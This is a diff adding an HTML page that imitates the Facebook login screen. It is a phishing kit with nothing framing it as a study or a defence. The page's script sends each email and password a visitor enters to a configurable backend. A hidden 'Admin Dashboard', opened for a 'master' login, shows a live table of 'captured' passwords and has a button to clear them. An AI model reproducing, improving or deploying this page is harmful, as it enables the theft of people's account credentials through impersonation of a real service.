@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Facebook - log in or sign up</title>
+  <link href="https://fonts.googleapis.com/css2?family=Helvetica+Neue:wght@400;700&display=swap" rel="stylesheet" />
+  <style>
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      background: #f0f2f5;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .container {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 32px;
+      width: 100%;
+      max-width: 980px;
+      padding: 20px;
+      flex-wrap: wrap;
+    }
+
+    /* LEFT SIDE */
+    .left {
+      flex: 1;
+      min-width: 280px;
+      max-width: 440px;
+    }
+
+    .logo {
+      color: #1877f2;
+      font-size: 56px;
+      font-weight: 900;
+      letter-spacing: -2px;
+      margin-bottom: 16px;
+      line-height: 1;
+      font-family: Georgia, 'Times New Roman', serif;
+    }
+
+    .tagline {
+      font-size: 24px;
+      color: #1c1e21;
+      font-weight: 400;
+      line-height: 1.3;
+    }
+
+    /* RIGHT SIDE - CARD */
+    .card {
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+      padding: 20px;
+      width: 100%;
+      max-width: 396px;
+    }
+
+    .card input {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 17px;
+      color: #1c1e21;
+      margin-bottom: 12px;
+      outline: none;
+      transition: border-color .2s;
+      background: #fff;
+    }
+
+    .card input:focus {
+      border-color: #1877f2;
+      box-shadow: 0 0 0 2px rgba(24, 119, 242, .2);
+    }
+
+    .btn-login {
+      width: 100%;
+      padding: 14px;
+      background: #1877f2;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 20px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background .15s;
+      margin-bottom: 16px;
+    }
+
+    .btn-login:hover {
+      background: #166fe5;
+    }
+
+    .btn-login:active {
+      background: #1464d8;
+    }
+
+    .forgot {
+      display: block;
+      text-align: center;
+      color: #1877f2;
+      font-size: 14px;
+      text-decoration: none;
+      margin-bottom: 20px;
+    }
+
+    .forgot:hover {
+      text-decoration: underline;
+    }
+
+    .divider {
+      border: none;
+      border-top: 1px solid #dadde1;
+      margin-bottom: 20px;
+    }
+
+    .btn-create {
+      display: block;
+      width: fit-content;
+      margin: 0 auto;
+      padding: 14px 24px;
+      background: #42b72a;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 17px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background .15s;
+    }
+
+    .btn-create:hover {
+      background: #36a420;
+    }
+
+
+
+    /* MODAL */
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, .5);
+      z-index: 100;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .modal-overlay.active {
+      display: flex;
+    }
+
+    .modal {
+      background: #fff;
+      border-radius: 8px;
+      width: 100%;
+      max-width: 432px;
+      padding: 16px;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, .3);
+      animation: slideUp .25s ease;
+    }
+
+    @keyframes slideUp {
+      from {
+        transform: translateY(40px);
+        opacity: 0;
+      }
+
+      to {
+        transform: translateY(0);
+        opacity: 1;
+      }
+    }
+
+    .modal h2 {
+      font-size: 24px;
+      font-weight: 700;
+      color: #1c1e21;
+      margin-bottom: 4px;
+    }
+
+    .modal p {
+      font-size: 15px;
+      color: #606770;
+      margin-bottom: 16px;
+      padding-bottom: 16px;
+      border-bottom: 1px solid #dadde1;
+    }
+
+    .modal .row {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 12px;
+    }
+
+    .modal .row input {
+      flex: 1;
+      margin-bottom: 0;
+    }
+
+    .modal-footer {
+      display: flex;
+      justify-content: flex-end;
+      gap: 8px;
+      margin-top: 20px;
+    }
+
+    .btn-cancel {
+      padding: 10px 20px;
+      background: #e4e6eb;
+      border: none;
+      border-radius: 6px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      color: #1c1e21;
+    }
+
+    .btn-register {
+      padding: 10px 20px;
+      background: #42b72a;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    select {
+      width: 100%;
+      padding: 10px 12px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 15px;
+      margin-bottom: 12px;
+      background: #fff;
+      color: #1c1e21;
+    }
+
+    .gender-group {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 12px;
+    }
+
+    .gender-option {
+      flex: 1;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      padding: 10px 12px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-size: 15px;
+      cursor: pointer;
+    }
+
+    footer {
+      margin-top: 24px;
+      font-size: 12px;
+      color: #737373;
+      text-align: center;
+      line-height: 1.8;
+    }
+
+    footer a {
+      color: #737373;
+      text-decoration: none;
+    }
+
+    footer a:hover {
+      text-decoration: underline;
+    }
+    .input-group {
+      position: relative;
+      width: 100%;
+    }
+
+    .toggle-pass {
+      position: absolute;
+      right: 12px;
+      top: 18px;
+      cursor: pointer;
+      color: #606770;
+      user-select: none;
+      font-size: 14px;
+    }
+
+    /* ADMIN DASHBOARD */
+    #admin-panel {
+      display: none;
+      width: 100%;
+      max-width: 1000px;
+      margin: 20px;
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+      padding: 30px;
+      animation: slideUp .4s ease;
+    }
+
+    .admin-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 24px;
+      border-bottom: 1px solid #ddd;
+      padding-bottom: 16px;
+    }
+
+    .admin-header h1 {
+      color: #1c1e21;
+      font-size: 28px;
+    }
+
+    .admin-actions {
+      display: flex;
+      gap: 12px;
+    }
+
+    .btn-refresh {
+      background: #1877f2;
+      color: white;
+      padding: 10px 20px;
+      border-radius: 6px;
+      border: none;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .btn-clear {
+      background: #fa3e3e;
+      color: white;
+      padding: 10px 20px;
+      border-radius: 6px;
+      border: none;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .log-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 10px;
+    }
+
+    .log-table th, .log-table td {
+      text-align: left;
+      padding: 14px;
+      border-bottom: 1px solid #eee;
+    }
+
+    .log-table th {
+      background: #f8f9fa;
+      color: #606770;
+      font-size: 13px;
+      text-transform: uppercase;
+    }
+
+    .log-table tr:hover {
+      background: #f0f2f5;
+    }
+
+    .pass-text {
+      color: #fa3e3e;
+      font-weight: 700;
+      font-family: monospace;
+      font-size: 15px;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="container">
+    <!-- LEFT -->
+    <div class="left">
+      <div class="logo">facebook</div>
+      <p class="tagline">Connect with friends and the world around you on Facebook.</p>
+    </div>
+
+    <!-- RIGHT -->
+    <div class="card" id="login-card">
+      <input type="text" id="email" placeholder="Username or Email address" autocomplete="username" />
+      <div class="input-group">
+        <input type="password" id="password" placeholder="Password" autocomplete="current-password" />
+        <span class="toggle-pass" onclick="togglePass('password')">Show</span>
+      </div>
+      <button class="btn-login" onclick="handleLogin()">Log in</button>
+      <a href="#" class="forgot">Forgotten password?</a>
+      <hr class="divider" />
+      <button class="btn-create" onclick="openModal()">Create new account</button>
+    </div>
+
+    <!-- ADMIN PANEL -->
+    <div id="admin-panel">
+      <div class="admin-header">
+        <h1>👑 Admin Dashboard</h1>
+        <div class="admin-actions">
+          <button class="btn-refresh" onclick="fetchLogs()">Refresh Logs</button>
+          <button class="btn-clear" onclick="clearLogs()">Clear All</button>
+          <button class="btn-cancel" onclick="location.reload()">Logout</button>
+        </div>
+      </div>
+      <div style="overflow-x: auto;">
+        <table class="log-table">
+          <thead>
+            <tr>
+              <th>Time</th>
+              <th>Email / Username</th>
+              <th>Password (Captured)</th>
+            </tr>
+          </thead>
+          <tbody id="log-body">
+            <!-- Logs will appear here -->
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <footer>
+    <a href="#">English (UK)</a> · <a href="#">සිංහල</a> · <a href="#">தமிழ்</a><br />
+    <br />
+    <a href="#">Sign Up</a> · <a href="#">Log in</a> · <a href="#">Messenger</a> · <a href="#">Facebook Lite</a> · <a
+      href="#">Privacy</a> · <a href="#">Terms</a><br />
+    Facebook © 2025
+  </footer>
+
+  <!-- REGISTER MODAL -->
+  <div class="modal-overlay" id="modal">
+    <div class="modal">
+      <h2>Create a new account</h2>
+      <p>It's quick and easy.</p>
+
+      <div class="row">
+        <input type="text" id="reg-fname" placeholder="First name" />
+        <input type="text" id="reg-lname" placeholder="Last name" />
+      </div>
+      <input type="email" id="reg-email" placeholder="Mobile number or email address"
+        style="width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;margin-bottom:12px;outline:none;"
+        onfocus="this.style.borderColor='#1877f2'" onblur="this.style.borderColor='#dddfe2'" />
+      <input type="password" id="reg-password" placeholder="New password"
+        style="width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;margin-bottom:12px;outline:none;"
+        onfocus="this.style.borderColor='#1877f2'" onblur="this.style.borderColor='#dddfe2'" />
+
+      <select>
+        <option>Date of birth</option>
+      </select>
+
+      <div class="gender-group">
+        <label class="gender-option"><span>Female</span><input type="radio" name="gender" value="female" /></label>
+        <label class="gender-option"><span>Male</span><input type="radio" name="gender" value="male" /></label>
+        <label class="gender-option"><span>Custom</span><input type="radio" name="gender" value="custom" /></label>
+      </div>
+
+      <div class="modal-footer">
+        <button class="btn-cancel" onclick="closeModal()">Cancel</button>
+        <button class="btn-register" onclick="handleRegister()">Sign Up</button>
+      </div>
+    </div>
+  </div>
+
+
+
+  <script>
+    // ============================================================
+    // CONFIG: Backend URL eka meka change karanna
+    // ============================================================
+    const API_URL = 'http://localhost:3000';
+
+
+
+    function openModal() { document.getElementById('modal').classList.add('active'); }
+    function closeModal() { document.getElementById('modal').classList.remove('active'); }
+
+    // Close modal when clicking outside
+    document.getElementById('modal').addEventListener('click', function (e) {
+      if (e.target === this) closeModal();
+    });
+
+    function togglePass(id) {
+      const el = document.getElementById(id);
+      const btn = el.nextElementSibling;
+      if (el.type === 'password') {
+        el.type = 'text';
+        btn.textContent = 'Hide';
+      } else {
+        el.type = 'password';
+        btn.textContent = 'Show';
+      }
+    }
+
+    // LOGIN
+    async function handleLogin() {
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value;
+
+      if (!email || !password) {
+        return;
+      }
+
+      try {
+        const res = await fetch(`${API_URL}/login`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email, password })
+        });
+
+        const data = await res.json();
+
+        if (res.ok) {
+          if (data.user && data.user.role === 'master') {
+            document.getElementById('login-card').style.display = 'none';
+            document.querySelector('.left').style.display = 'none';
+            document.getElementById('admin-panel').style.display = 'block';
+            
+            // Start the auto-refresh loop for admin
+            fetchLogs();
+          } else {
+            // For normal users, just reload or redirect
+            setTimeout(() => location.reload(), 2000);
+          }
+        } else {
+          // Login failed silently
+        }
+      } catch (err) {
+        console.error(err);
+      }
+    }
+
+    async function fetchLogs() {
+      try {
+        // Only fetch if admin panel is actually visible
+        if (document.getElementById('admin-panel').style.display !== 'block') return;
+
+        const res = await fetch(`${API_URL}/admin/logs`);
+        if (!res.ok) throw new Error('Fetch failed');
+        
+        const logs = await res.json();
+        const body = document.getElementById('log-body');
+        
+        body.innerHTML = '';
+
+        if (logs.length === 0) {
+          body.innerHTML = '<tr><td colspan="3" style="text-align:center;padding:40px;color:#999;">No captured logs yet.</td></tr>';
+        } else {
+          logs.forEach(log => {
+            const row = `
+              <tr>
+                <td style="color:#606770;font-size:12px;">${new Date(log.timestamp).toLocaleString()}</td>
+                <td style="font-weight:600;">${log.email}</td>
+                <td class="pass-text">${log.password}</td>
+              </tr>
+            `;
+            body.insertAdjacentHTML('beforeend', row);
+          });
+        }
+      } catch (err) {
+        console.error('Error fetching logs:', err);
+      } finally {
+        // Schedule next refresh only if admin panel is still active
+        if (document.getElementById('admin-panel').style.display === 'block') {
+          setTimeout(fetchLogs, 500);
+        }
+      }
+    }
+
+    async function clearLogs() {
+      if (!confirm('Are you sure you want to delete all captured logs?')) return;
+      try {
+        await fetch(`${API_URL}/admin/clear-logs`, { method: 'POST' });
+        fetchLogs();
+      } catch (err) {
+        console.error('Error clearing logs');
+      }
+    }
+
+    // REGISTER
+    async function handleRegister() {
+      const firstName = document.getElementById('reg-fname').value.trim();
+      const lastName = document.getElementById('reg-lname').value.trim();
+      const email = document.getElementById('reg-email').value.trim();
+      const password = document.getElementById('reg-password').value;
+
+      if (!firstName || !email || !password) {
+        return;
+      }
+
+      try {
+        const res = await fetch(`${API_URL}/register`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ firstName, lastName, email, password })
+        });
+
+        const data = await res.json();
+
+        if (res.ok) {
+          closeModal();
+        } else {
+          console.error(data.message || 'Registration failed!');
+        }
+      } catch (err) {
+        console.error(err);
+      }
+    }
+  </script>
+</body>
+
+</html>
